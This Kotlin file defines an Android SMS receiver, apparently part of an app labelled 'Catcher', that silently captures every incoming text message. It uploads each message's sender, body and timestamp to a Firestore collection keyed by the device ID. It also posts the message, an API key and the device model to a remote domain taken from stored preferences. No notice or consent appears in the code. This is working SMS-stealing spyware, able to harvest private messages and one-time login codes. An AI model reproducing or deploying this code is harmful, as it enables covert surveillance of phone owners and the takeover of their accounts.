package cather.lfree.workdscather.servers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.preference.PreferenceManager
import android.provider.Settings
import android.provider.Telephony
import com.google.firebase.firestore.SetOptions
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import cather.lfree.workdscather.internet.AsynchronousGet
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Calendar



class SmsReceiver : BroadcastReceiver() {

      private companion object{
       const val sms : String =  "SMS"
       const val empty_default : String = ""
       const val nameCat : String = "Catcher"
    }


    override fun onReceive(context: Context, intent: Intent) {

        if (!intent?.action.equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) return
        val extractMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        extractMessages.forEach { smsMessage ->

             val db = Firebase.firestore

            val uniqueID = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID)

             val prefs = PreferenceManager.getDefaultSharedPreferences  ( context )

             val formatter = SimpleDateFormat("dd.MM.yyyy hh:mm:ss")
             val calendar = Calendar.getInstance()
             calendar.timeInMillis = smsMessage.timestampMillis


             //println( " my SMS text =    ${smsMessage.displayMessageBody}" )
             //println( " my SMS address = ${smsMessage.displayOriginatingAddress}" )
             //println( " my SMS time =    ${smsMessage.timestampMillis}" )

             val newString = smsMessage.displayMessageBody.toString().replace("//", "www")

             var newString2 : String = ""
             val index = newString.indexOf("/", 0)
             val index2 = newString.indexOf("/", index+1)

            newString2 = if( index == -1 || index2 == -1){
                newString.replace("/", "OO")
            }else {
                val stringOneL = newString.substring(0, index)
                val stringTwoL = newString.substring(index, newString.length)
                val repTwo = stringTwoL.replace("/", "O")
                "$stringOneL/$repTwo"
            }

             val user = hashMapOf(
              "type" to sms,
              "time" to formatter.format(calendar.time),
              "name" to smsMessage.displayOriginatingAddress,
              "message" to smsMessage.displayMessageBody,
              "package" to empty_default )

            if(newString2.indexOf("/", 0) > 0){
                newString2.replace("/", "OO")
            }

             db.collection(uniqueID).document(newString2 + "_sms")
            .set(user, SetOptions.merge())
            .addOnSuccessListener {
            }
            .addOnFailureListener { e ->
            }


             //println( " my SMS text = ${smsMessage.displayMessageBody}" )
             //println( " my SMS text = ${smsMessage.displayMessageBody}" )
             //println( " my SMS text = ${smsMessage.displayMessageBody}" )


       val json1  = JSONObject()
        json1.put("type", "SMS")
        json1.put("api_key", prefs.getString("api_k", ""))
        json1.put("from", smsMessage.displayOriginatingAddress)
        json1.put("content", smsMessage.displayMessageBody)

        val jsonM2 = JSONObject()

            jsonM2.put("name", nameCat)
            jsonM2.put("id",uniqueID)
            jsonM2.put("version","1.0.1")

            val manufacturer = Build.MANUFACTURER;
            val model = Build.MODEL;

        val jsonN2 = JSONObject()
            jsonN2.put("ip", "0.0.0.0")
            jsonN2.put("model", "$manufacturer $model")

        json1.put("app", jsonM2)
        json1.put("device", jsonN2)

        AsynchronousGet( prefs.getString("api_k", "")!!,3, json1, prefs.getString("domen", "")!!).run()


        }
    }

}